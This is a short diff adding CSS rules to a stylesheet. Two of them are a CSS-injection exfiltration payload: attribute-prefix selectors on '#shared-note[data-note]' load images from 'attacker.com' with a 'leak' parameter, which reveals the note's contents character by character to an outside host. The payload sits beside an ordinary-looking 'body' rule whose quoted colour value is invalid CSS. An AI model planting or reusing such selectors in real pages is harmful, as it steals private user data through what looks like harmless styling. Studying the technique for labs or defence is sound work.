@@ -1,0 +1,6 @@
+#shared-note[data-note^="a"] { background: url("https://attacker.com/?leak=a"); }
+#shared-note[data-note^="b"] { background: url("https://attacker.com/?leak=b"); }
+
+body {
+    background: '#00f';
+}
